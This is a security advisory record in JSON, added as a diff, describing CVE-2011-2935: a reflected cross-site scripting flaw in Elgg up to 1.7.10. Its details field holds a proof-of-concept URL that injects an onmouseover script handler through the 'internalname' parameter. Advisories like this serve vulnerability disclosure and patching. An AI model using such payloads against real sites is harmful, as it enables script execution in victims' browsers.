@@ -1,0 +1,84 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-mcfm-j5g6-w26f",
+  "modified": "2024-01-12T22:05:22Z",
+  "published": "2022-04-22T00:24:11Z",
+  "aliases": [
+    "CVE-2011-2935"
+  ],
+  "summary": "Elgg Reflected XSS Vulnerability",
+  "details": "### VULNERABILITY DESCRIPTION\nThe `internalname` parameter is not properly sanitized, which allows attacker to conduct Cross Site Scripting attack. This may allow an attacker to create a specially crafted URL that would execute arbitrary script code in a victim's browser\n\n### PROOF-OF-CONCEPT/EXPLOIT\n```http\nhttp://localhost/pg/embed/media?internalname=%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "elgg/elgg"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.7.11"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.7.10"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2935"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Elgg/Elgg/issues/3544"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Elgg/Elgg/commit/2843b4f846874d434a2403ac1f27e41035b45e04"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Elgg/Elgg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://oss-security.openwall.narkive.com/1UH3NYx8/cve-request-elgg-1-7-10-multiple-vulnerabilities"
+    },
+    {
+      "type": "WEB",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2011-2935"
+    },
+    {
+      "type": "WEB",
+      "url": "https://web.archive.org/web/20110907122607/http://blog.elgg.org/pg/blog/brett/read/189/elgg-1711-released"
+    },
+    {
+      "type": "WEB",
+      "url": "http://yehg.net/lab/pr0js/advisories/[elgg_1710]_xss_sqlin"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-01-12T22:05:22Z",
+    "nvd_published_at": "2019-11-12T14:15:00Z"
+  }
+}
